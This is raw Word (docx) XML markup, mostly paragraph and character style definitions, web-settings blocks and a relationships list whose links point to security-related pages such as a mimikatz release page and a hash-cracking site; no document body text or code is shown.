    <w:rsid w:val="00EC27F5"/>
    <w:rsid w:val="00ED2F72"/>
    <w:rsid w:val="00EF5198"/>
    <w:rsid w:val="00F00345"/>
    <w:rsid w:val="00F004B6"/>
    <w:rsid w:val="00F12A52"/>
    <w:rsid w:val="00F159A5"/>
    <w:rsid w:val="00F22F62"/>
    <w:rsid w:val="00F23E6A"/>
    <w:rsid w:val="00F4502A"/>
    <w:rsid w:val="00F629C8"/>
    <w:rsid w:val="00F63B8B"/>
    <w:rsid w:val="00F662A3"/>
    <w:rsid w:val="00F84F74"/>
    <w:rsid w:val="00F901F4"/>
    <w:rsid w:val="00FA314C"/>
    <w:rsid w:val="00FE7C59"/>
    <w:rsid w:val="00FF4D2E"/>
    <w:rsid w:val="00FF51EB"/>
    <w:rsid w:val="00FF69A5"/>
    <w:rsid w:val="00FF7616"/>
    <w:rsid w:val="00FF7CAE"/>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8433"/>
    <o:shapelayout v:ext="edit">
      <o:idmap v:ext="edit" data="1"/>
    </o:shapelayout>
  </w:shapeDefaults>
  <w:decimalSymbol w:val="."/>
  <w:listSeparator w:val=","/>
  <w14:docId w14:val="264CCF16"/>
  <w15:docId w15:val="{9A75A6C3-13A7-4DB5-BD8B-073770D3A8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D7B3D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="004D7B3D"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:pageBreakBefore/>
      <w:numPr>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:spacing w:before="360"/>
      <w:jc w:val="right"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="48"/>
      <w:szCs w:val="36"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="009525A9"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="12" w:space="1" w:color="auto"/>
      </w:pBdr>
      <w:spacing w:before="360" w:after="200"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="2"/>
        <w:numId w:val="12"/>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404615"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="3"/>
        <w:numId w:val="12"/>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404615"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="4"/>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="252525" w:themeColor="text2" w:themeShade="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading6">
    <w:name w:val="heading 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading6Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="5"/>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="5"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="252525" w:themeColor="text2" w:themeShade="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading7">
    <w:name w:val="heading 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading7Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>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04615"/>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04615"/>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363BE"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:contextualSpacing/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="56"/>
      <w:szCs w:val="56"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TitleChar">
    <w:name w:val="Title Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Title"/>
    <w:uiPriority w:val="10"/>
    <w:rsid w:val="003363BE"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="56"/>
      <w:szCs w:val="56"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Subtitle">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="SubtitleChar"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>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404615"/>
    <w:rPr>
      <w:color w:val="5A5A5A" w:themeColor="text1" w:themeTint="A5"/>
      <w:spacing w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="004D7B3D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Calibri" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="48"/>
      <w:szCs w:val="36"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="009525A9"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Calibri" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00404615"/>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sid w:val="00404615"/>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404615"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="252525" w:themeColor="text2" w:themeShade="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading6Char">
    <w:name w:val="Heading 6 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading6"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="252525" w:themeColor="text2" w:themeShade="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading7Char">
    <w:name w:val="Heading 7 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading7"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00404615"/>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404615"/>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04615"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleEmphasis">
    <w:name w:val="Subtle Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="19"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseEmphasis">
    <w:name w:val="Intense Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="21"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:caps/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="29"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:spacing w:before="160"/>
      <w:ind w:left="720" w:right="720"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QuoteChar">
    <w:name w:val="Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Quote"/>
    <w:uiPriority w:val="29"/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IntenseQuote">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="IntenseQuoteChar"/>
    <w:uiPriority w:val="30"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>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404615"/>
    <w:rPr>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2" w:themeFill="background1" w:themeFillShade="F2"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleReference">
    <w:name w:val="Subtle Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="31"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>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404615"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="BookTitle">
    <w:name w:val="Book Title"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="33"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:b w:val="0"/>
      <w:bCs w:val="0"/>
      <w:smallCaps/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="35"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:spacing w:after="200" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="323232" w:themeColor="text2"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NoSpacing">
    <w:name w:val="No Spacing"/>
    <w:link w:val="NoSpacingChar"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="003C77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27573"/>
    <w:rPr>
      <w:color w:val="6B9F25" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="PlainTable11">
    <w:name w:val="Plain Table 11"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="41"/>
    <w:rsid w:val="006B38D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NoSpacingChar">
    <w:name w:val="No Spacing Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="NoSpacing"/>
    <w:uiPriority w:val="1"/>
    <w:rsid w:val="00046389"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="code">
    <w:name w:val="code"/>
    <w:basedOn w:val="NoSpacing"/>
    <w:link w:val="codeChar"/>
    <w:qFormat/>
    <w:rsid w:val="00DD22DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00712DC9"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="codeChar">
    <w:name w:val="code Char"/>
    <w:basedOn w:val="NoSpacingChar"/>
    <w:link w:val="code"/>
    <w:rsid w:val="00DD22DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00712DC9"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="220"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00712DC9"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="440"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004E73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733D"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004E73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733D"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00BE6B7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E6B72"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Abtracttitle">
    <w:name w:val="Abtracttitle"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="AbtracttitleChar"/>
    <w:qFormat/>
    <w:rsid w:val="009525A9"/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="left" w:pos="2390"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="40"/>
      <w:szCs w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="AbtracttitleChar">
    <w:name w:val="Abtracttitle Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Abtracttitle"/>
    <w:rsid w:val="009525A9"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:sz w:val="40"/>
      <w:szCs w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="TableGrid0">
    <w:name w:val="TableGrid"/>
    <w:rsid w:val="009525A9"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
    <w:tblPr>
      <w:tblCellMar>
        <w:top w:w="0" w:type="dxa"/>
        <w:left w:w="0" w:type="dxa"/>
        <w:bottom w:w="0" w:type="dxa"/>
        <w:right w:w="0" w:type="dxa"/>
      </w:tblCellMar>
    </w:tblPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Revision">
    <w:name w:val="Revision"/>
    <w:hidden/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00BA7AE1"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="FootnoteText">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FootnoteTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00CA5897"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FootnoteTextChar">
    <w:name w:val="Footnote Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="FootnoteText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00CA5897"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FootnoteReference">
    <w:name w:val="footnote reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00CA5897"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00154C09"/>
    <w:rPr>
      <w:color w:val="B26B02" w:themeColor="followedHyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002B5CA3"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyText">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyTextChar"/>
    <w:rsid w:val="00ED2F72"/>
    <w:pPr>
      <w:spacing w:after="120" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="MS Mincho" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextChar">
    <w:name w:val="Body Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BodyText"/>
    <w:rsid w:val="00ED2F72"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="MS Mincho" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>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617809">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="413355550">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="527959984">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="724990304">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="970208279">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1009990340">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1316841263">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1391419963">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1663504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github.com/gentilkiwi/mimikatz/releases" TargetMode="External"/><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hyperlink" Target="https://searchsecurity.techtarget.com/definition/RAT-remote-access-Trojan" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image25.png"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image26.png"/><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hyperlink" Target="https://hashkiller.co.uk/Cracker" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.bbc.co.uk/news/business-48905907" TargetMode="External"/><Relationship Id="rId40" 